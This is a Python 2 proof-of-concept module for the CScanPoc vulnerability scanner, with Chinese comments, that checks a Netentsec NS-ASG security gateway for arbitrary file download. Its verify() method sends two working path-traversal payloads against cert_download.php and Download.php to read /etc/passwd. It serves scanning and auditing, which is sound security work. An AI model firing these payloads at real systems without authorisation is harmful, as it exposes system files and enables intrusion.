# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re, urlparse

class Vuln(ABVuln):
    vuln_id = 'Netentsec_0023'  # 平台漏洞编号，留空
    name = '网康NS-ASG 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-04-30'  # 漏洞公布时间
    desc = '''
        网康 NS-ASG 应用安全网关多处 任意文件下载漏洞：
        /admin/cert_download.php?file=
        /commonplugin/Download.php?reqfile=
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '网康应用安全网关'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'b9c831bd-7f70-436a-a675-1dfca5214e82'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #refer: http://www.wooyun.org/bugs/wooyun-2014-058932
            #refer: http://www.wooyun.org/bugs/wooyun-2015-097832
            hh = hackhttp.hackhttp()
            arg = self.target
            payloads = [
                arg + '/admin/cert_download.php?file=acdefghijk&certfile=certs/../../../../../../../../etc/passwd',
                arg + '/commonplugin/Download.php?reqfile=../../../../../etc/passwd',
            ]
            for payload in payloads:
                code, head, res, err, _ = hh.http(payload)

                if (code==200) and ('root:' in res):
                    #security_hole('Arbitrarily file download: ' + payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
